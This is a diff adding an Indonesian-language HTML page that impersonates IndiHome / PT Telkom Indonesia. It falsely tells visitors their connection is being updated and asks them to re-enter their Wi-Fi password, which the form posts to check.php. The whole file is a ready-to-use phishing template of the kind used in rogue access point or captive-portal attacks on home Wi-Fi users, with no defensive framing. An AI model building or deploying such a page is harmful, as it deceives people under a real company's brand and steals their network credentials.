@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IndiHome - Verifikasi Keamanan</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: #333;
+        }
+        .container {
+            background-color: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+        .logo {
+            width: 180px;
+            margin-bottom: 20px;
+        }
+        h2 {
+            color: #e60000; /* IndiHome Red */
+            margin-bottom: 10px;
+            font-size: 22px;
+        }
+        p {
+            font-size: 14px;
+            margin-bottom: 25px;
+            line-height: 1.5;
+            color: #666;
+        }
+        input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 20px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+        input[type="password"]:focus {
+            border-color: #e60000;
+            outline: none;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #e60000;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #cc0000;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #aaa;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Pastikan file logo.png ada di folder yang sama -->
+        <img src="logo.png" alt="IndiHome" class="logo">
+        
+        <h2>Verifikasi Koneksi</h2>
+        <p>Koneksi internet Anda sedang kami perbarui. Silakan masukkan kembali <strong>Kata Sandi Wi-Fi</strong> Anda untuk verifikasi dan melanjutkan brosing.</p>
+        
+        <form method="POST" action="check.php">
+            <input type="password" name="password" placeholder="Kata Sandi Wi-Fi" required>
+            <button type="submit">Verifikasi & Lanjutkan</button>
+        </form>
+
+        <div class="footer">
+            &copy; 2026 PT Telkom Indonesia (Persero) Tbk.
+        </div>
+    </div>
+</body>
+</html>
